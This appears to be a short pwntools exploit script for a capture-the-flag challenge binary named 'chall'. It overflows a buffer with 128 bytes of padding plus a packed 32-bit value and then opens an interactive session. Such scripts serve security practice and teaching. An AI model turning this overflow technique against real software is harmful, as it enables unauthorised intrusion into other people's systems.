from pwn import *

elf = ELF('./chall')
context.binary = elf
p = process(elf.path)

padding = b'A'*128

payload = p32(2752022)

p.recv()

p.sendline(padding + payload)

p.interactive()
